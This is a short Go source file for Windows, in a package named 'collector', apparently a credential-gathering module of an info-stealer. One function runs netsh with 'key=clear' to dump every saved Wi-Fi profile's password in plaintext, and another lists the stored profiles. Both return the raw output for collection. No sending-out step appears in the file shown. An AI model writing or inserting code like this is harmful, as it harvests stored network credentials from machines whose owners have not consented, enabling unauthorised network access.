//go:build windows

package collector

import (
"os/exec"
)

func GetWiFiPasswords() string {
cmd := exec.Command("cmd", "/c", "netsh wlan show profile name=\"*\" key=clear")
output, err := cmd.Output()
if err != nil {
return ""
}
return string(output)
}

func GetWiFiProfiles() string {
cmd := exec.Command("cmd", "/c", "netsh wlan show profiles")
output, err := cmd.Output()
if err != nil {
return ""
}
return string(output)
}
